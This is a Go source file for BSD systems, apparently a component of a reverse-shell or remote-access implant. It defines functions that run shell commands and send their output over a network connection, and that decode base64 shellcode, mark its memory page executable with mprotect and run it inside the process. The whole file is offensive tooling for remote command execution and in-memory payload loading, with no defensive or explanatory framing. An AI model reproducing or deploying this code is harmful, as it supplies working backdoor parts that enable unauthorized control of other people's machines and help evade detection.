//go:build freebsd || openbsd || netbsd || dragonfly
// +build freebsd openbsd netbsd dragonfly

package shell

import (
	"encoding/base64"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
	"errors"
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("/bin/sh")
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "/bin/sh"
	cmd := exec.Command(cmd_path, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

// Get the page containing the given pointer
// as a byte slice.
func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
}

func MprotectBSD(b []byte, prot int) (err error) {
    _zero := []byte("")
    var _p0 unsafe.Pointer
    if len(b) > 0 {
        _p0 = unsafe.Pointer(&b[0])
    } else {
        _p0 = unsafe.Pointer(&_zero)
    }
    _, _, e1 := syscall.Syscall(syscall.SYS_MPROTECT, uintptr(_p0), uintptr(len(b)), uintptr(prot))
    if e1 != 0 {
	// err = syscall.errnoErr(e1)
	if e1 == 0 {
		return nil
	} else {
		return errors.New("syscall error")
	}
    }
    return
}

// Set the memory page containing the shellcode
// to R-X, then executes the shellcode as a function.
func ExecShellcode(shellcode []byte) {
	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
	page := getPage(shellcodeAddr)
	MprotectBSD(page, syscall.PROT_READ|syscall.PROT_EXEC)
	shellPtr := unsafe.Pointer(&shellcode)
	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellPtr))
	go shellcodeFuncPtr()
}

// Decodes base64 encoded shellcode
// and execute within same process.
func ExecShellcode_b64(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			ExecShellcode(shellcode)
		}
	}
	return
}
